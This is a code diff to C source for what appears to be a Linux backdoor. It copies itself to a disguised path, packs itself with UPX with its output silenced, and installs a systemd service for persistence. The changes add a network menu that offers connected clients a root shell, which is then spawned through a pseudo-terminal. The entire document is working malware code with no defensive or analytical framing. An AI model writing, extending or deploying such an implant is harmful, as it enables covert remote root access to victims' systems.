@@ -68,7 +68,7 @@ void copy_to_standard_location()
 
     close(source_fd);
     close(target_fd);
-    system("upx --best " DISGUISED_TARGET_PATH);
+    system("upx --best " DISGUISED_TARGET_PATH " 2>/dev/null 1>/dev/null");
 }
 
 void create_service_file(int systemd_enabled)
@@ -196,10 +196,60 @@ void handle_sigchld(int sig)
     }
 }
 
+int mid_state_promt(int client_socket)
+{
+    int shell = 0;
+    char buffer[1024];
+
+    while (1)
+    {
+        send(client_socket, "> ", 2, 0);
+
+        int bytes_received = recv(client_socket, buffer, sizeof(buffer) - 1, 0);
+        if (bytes_received <= 0)
+        {
+            if (bytes_received == 0)
+            {
+                printf("Connection closed by client.\n");
+            }
+            else
+            {
+                perror("recv");
+            }
+            break;
+        }
+
+        buffer[bytes_received - 1] = '\0';
+
+        if (strcmp(buffer, "?") == 0)
+        {
+            const char* help_message = "Help Menu:\n? - Shows help menu\nshell - Provides a root shell\n";
+            send(client_socket, help_message, strlen(help_message), 0);
+        }
+        else if (strcmp(buffer, "shell") == 0)
+        {
+            shell = 1;
+            break;
+        }
+        else if (strlen(buffer) == 0)
+        {
+            continue;
+        }
+        else
+        {
+            const char* invalid_command_message = "Invalid command. Type '?' for help.\n";
+            send(client_socket, invalid_command_message, strlen(invalid_command_message), 0);
+        }
+    }
+
+    return shell;
+}
+
 void handle_client(int client_socket, const char *client_ip)
 {
     char buffer[1024];
     int authenticated = 0;
+    int shell = 0;
     FILE *log = NULL;
     size_t total_data_sent = 0;
     size_t total_data_received = 0;
@@ -243,7 +293,9 @@ void handle_client(int client_socket, const char *client_ip)
         log = NULL;
     }
 
-    if (authenticated)
+    shell = mid_state_promt(client_socket);
+
+    if (authenticated && shell)
     {
         int master_fd;
         pid_t pid = forkpty(&master_fd, NULL, NULL, NULL);  // Create a PTY for the child process
